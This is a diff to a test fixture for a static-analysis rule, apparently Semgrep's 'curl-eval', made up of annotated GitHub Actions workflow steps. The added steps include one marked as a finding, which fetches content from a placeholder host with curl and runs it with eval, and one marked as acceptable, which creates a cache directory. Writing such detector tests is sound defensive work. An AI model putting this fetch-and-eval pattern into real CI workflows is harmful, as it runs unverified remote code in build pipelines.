@@ -23,3 +23,17 @@ jobs:
         run: |
           CONTENTS=$(curl https://blah.com)
           eval $CONTENTS
+      - name: Explicit Bash shell
+        shell: bash
+        # ruleid: curl-eval
+        run: |
+          CONTENTS=$(curl https://blah.com)
+          eval $CONTENTS
+      - name: Prepare Windows cache
+        shell: pwsh
+        # ok: curl-eval
+        run: |
+          $cacheDirs = @("D:\cache")
+          foreach ($dir in $cacheDirs) {
+            New-Item -ItemType Directory -Path $dir -Force | Out-Null
+          }
